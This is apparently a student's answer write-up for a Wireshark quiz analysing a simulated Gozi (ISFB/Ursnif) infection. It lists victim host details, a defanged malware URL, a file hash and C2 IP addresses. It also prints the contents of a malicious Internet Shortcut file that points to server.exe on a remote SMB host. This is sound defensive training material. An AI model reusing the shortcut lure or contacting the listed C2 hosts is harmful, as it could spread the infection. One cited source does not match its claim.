
This infection is based on previously reported [Gozi (ISFB/Ursnif) activity from March 6, 2023](https://github.com/pan-unit42/tweets/blob/master/2023-03-06-IOCs-for-Gozi-infection.txt). The pcap for this month’s Wireshark quiz is from an AD environment, and it contains real-world traffic from a simulated enterprise setting. Details of the local area network (LAN) from the pcap follow.


- LAN segment range: 172.16.1[.]0/24 (172.16.1[.]1 through 172.16.1[.]255)
-   Domain: pcapworkshop[.]net
-   Domain Controller IP address: 172.16.1[.]16
-   Domain Controller host name: PCAPWORKSHOP-DC
-   LAN segment gateway: 172.16.1[.]1
-   Land segment broadcast address: 172.16.1[.]255

---------------------



**Infection Time :** 2023-03-07 at 05:01:56
**Source-IP** : 172.16.1.137
**Mac** : 00:02:fb:34:b4:fa
**HostName** :  DESKTOP-3GJL3PV.local
**UserName** : sherita.kolb

-----------------------

## Malware

**Malicious-Url** : hxxp[://]unapromo[.]com/mise/Cliente[.]zip

**Malicious-IP** : 173[.]254[.]32[.]85

**FileName** : Cliente.zip

**SHA256** : 33db5b2a2cc592fd10c65ba38396e4c7574ad78e786d78e8a3acdc93a90c3209

------------------------------------


# Analysis

*The file mentioned is a Windows Internet Shortcut file. It is a file that contains a URL (Uniform Resource Locator) that points to a website or a file on your computer. The “.url” extension is used to indicate that it is an Internet Shortcut file.*


*The content of the file contains the following information:*

```Content
[InternetShortcut]
IconIndex=70
HotKey=0
IDList=
URL=file[://]46[.]8[.]19[.]32/mise/server.exe
IconFile=C:\Windows\system32\SHELL32.dll
[{000214A0-0000-0000-C000-000000000046}]
Prop3=19,9
```

*The “URL” field specifies the location of the file or website that the shortcut points to. In this case, it points to a file named “server.exe” located at “file://46[.]8[.]19[.]32/mise/”. [The other fields specify various properties of the shortcut such as the icon used for the shortcut and its location on your computer](https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-web-client-admin). However, After Investigation of the PCAP file shows that the IP 46[.]8[.]19[.]32 is a SMB server which have the server.exe binary : 

![[Screenshot_2023-05-06_00_01_31.png]]

*unfortunately, trying to export the server.exe binary will be out of reach because of the data benign transfer to the victime machine is not complete. so we cant relay on the binary file. *


![[Screenshot_2023-05-06_00_56_30.png]]

*However, after anlayzing the HTTP traffic shows the behaviour of the traffic of Gozi C2 server : 


![[Screenshot_2023-05-06_00_59_51.png]]

**[It uses various techniques such as HTTP POST requests, Linear Congruential Generator, and aPlib compression to communicate with its C2 server](https://www.blackhat.com/docs/eu-15/materials/eu-15-Bureau-Hiding-In-Plain-Sight-Advances-In-Malware-Covert-Communication-Channels.pdf)[2](https://www.blackhat.com/docs/eu-15/materials/eu-15-Bureau-Hiding-In-Plain-Sight-Advances-In-Malware-Covert-Communication-Channels.pdf). Ultimately, the goal of Gozi-ISFB malware is to gather confidential information from infected devices by connecting to C2 servers and installing additional malware modules on the network.**


-----------------

## C2 Address

- 173[.]254[.]32[.]85
- 62[.]173[.]140[.]103
- 62[.]173[.]138[.]138
- 62[.]173[.]149[.]243
- 62[.]173[.]140[.]94
- 31[.]41[.]44[.]60
- 46[.]8[.]19[.]233
- 5[.]44[.]45[.]201
- 89[.]116[.]236[.]41
- 62[.]173[.]140[.]76
- 31[.]41[.]44[.]49
- 23[.]77[.]213[.]161
- 8[.]253[.]198[.]120
- 46[.]8[.]19[.]86
- 8[.]238[.]136[.]254

